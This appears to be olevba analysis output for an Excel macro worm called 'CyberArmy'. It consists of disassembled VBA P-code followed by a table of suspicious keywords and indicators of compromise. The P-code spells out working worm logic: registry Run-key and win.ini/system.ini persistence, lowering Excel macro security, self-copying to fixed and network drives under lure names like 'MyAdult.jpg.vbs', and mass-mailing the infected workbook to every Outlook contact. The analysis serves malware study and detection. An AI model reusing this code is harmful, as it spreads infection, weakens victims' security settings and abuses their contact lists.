' 	PrintChan 
' 	LitStr 0x0058 "Wobj.regwrite"HKLM\system\currentcontrolset\services\Vxd\Vnetsup\Workgroup","Army" & nbr"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "msgbox" Haii....CyberARMY now protect your PC ""
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005A "wobj.regwrite"HKCU\Software\Microsoft\Windos\CurrentVersion\Policies\Explorer\NoClose","1""
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "wobj.regwrite"HKCU\Software\Microsoft\Office\9.0\Excel\Security\Level","1""
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0080 "Wobj.regwrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Army","wscript.exe "&Fso.GetSpecialFolder(1)& "\kernel32.vbs %""
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "editini sfold&"\win.ini","[windows]","load",sfold&"\kernel32.vbs""
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0052 "editini sfold&"\System.ini","[boot]","shell","Explorer.exe"& sfold&"\kernel32.vbs""
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "ntwrk()"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "sub cpdrv(drive)"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Set s = createobject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "set f=s.getfile(Wscript.scriptFullName)"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "nmfile = minute(now)"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Scfile = second(now)"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "f.copy("c:\windows\desktop\" & "ISO9" & Scfile & nmfile & ".exe.vbs")"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "f.copy(drive & "\MyAdult" & nmfile & ".jpg.vbs")"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "ff.copyfile "C:\Army.xls",drive & "\Army.xls",True"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "function showdrive(drvpath)"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "dim fso,d,t"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "set fso = CreateObject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Set  d= fso.getdrive(drvpath)"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "select case d.drivetype"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "case 0:t="Unknown""
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "case 1:t="removable""
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "case 2:t="Fixed""
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "case 3:t="network""
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "case 4:t="CD-ROM""
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "case 5:t="Ramdisk""
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "end select"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "if t="" then t="none""
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "showdrive = t"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "end function"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "sub ntwrk()"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "for n=65 to 90"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "l=chr(n)"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "drv=l&":""
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "d3=showdrive(drv)"
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "if d3="Fixed"then cpdrv(drv)"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "if d3="network" then cpdrv(drv)"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "next"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #169:
' 	LitStr 0x0019 "C:\WINDOWS\kernel.exe.vbs"
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Private Sub gofrnd())
' Line #172:
' 	OnError (Resume Next) 
' Line #173:
' 	Dim 
' 	VarDefn POIKJHDE765fghdHGFDHou
' 	VarDefn OIUYfd5456hg67gesrDGF
' 	VarDefn FJFrwwok435jgdDASFDG
' Line #174:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set POIKJHDE765fghdHGFDHou 
' Line #175:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld POIKJHDE765fghdHGFDHou 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set OIUYfd5456hg67gesrDGF 
' Line #176:
' 	Ld POIKJHDE765fghdHGFDHou 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #177:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld OIUYfd5456hg67gesrDGF 
' 	ArgsMemCall Logon 0x0002 
' Line #178:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld OIUYfd5456hg67gesrDGF 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #179:
' 	SetStmt 
' 	Ld x 
' 	Ld OIUYfd5456hg67gesrDGF 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set hgj87kl098sBADUSAs3dfg 
' Line #180:
' 	LitDI2 0x0001 
' 	St y 
' Line #181:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld POIKJHDE765fghdHGFDHou 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set FJFrwwok435jgdDASFDG 
' Line #182:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hgj87kl098sBADUSAs3dfg 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #183:
' 	Ld y 
' 	Ld hgj87kl098sBADUSAs3dfg 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #184:
' 	Ld Peep 
' 	Ld FJFrwwok435jgdDASFDG 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #185:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #186:
' 	Ld y 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld hgj87kl098sBADUSAs3dfg 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St z 
' 	EndIf 
' Line #187:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #188:
' 	LitStr 0x000F "Penting !! dari"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld FJFrwwok435jgdDASFDG 
' 	MemSt Subject 
' Line #189:
' 	LitStr 0x003E "di bawah ini laporan yang anda perlukan dalam attachment Excel"
' 	Ld FJFrwwok435jgdDASFDG 
' 	MemSt Body 
' Line #190:
' 	Ld ActiveWorkbook 
' 	MemLd FullName 
' 	Ld FJFrwwok435jgdDASFDG 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #191:
' 	Ld FJFrwwok435jgdDASFDG 
' 	ArgsMemCall Send 0x0000 
' Line #192:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #193:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #194:
' 	Ld OIUYfd5456hg67gesrDGF 
' 	ArgsMemCall Logoff 0x0000 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0019 "Software\Microsoft\Office"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld s 
' 	ArgsLd OLHcgtf67tgVFVFi76fv 0x0005 
' 	St v 
' Line #197:
' 	Ld s 
' 	LitStr 0x0004 "ARMY"
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x0031 "Major Grey of CyberArmy will change your duty ..."
' 	LitDI2 0x0000 
' 	ArgsLd TURDuy8ggrYDlu84k 0x0006 
' 	St v 
' Line #198:
' 	Ld s 
' 	ArgsLd uygYUG987uGYU897g 0x0001 
' 	St v 
' Line #199:
' 	EndSub 
' Line #200:
' Line #201:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|createobject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|IOC       |kernel.exe          |Executable file name                         |
|IOC       |Kernel32.vbs        |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |kernel32.vbs        |Executable file name                         |
|IOC       |Explorer.exe        |Executable file name                         |
|IOC       |exe.vbs             |Executable file name                         |
|IOC       |jpg.vbs             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

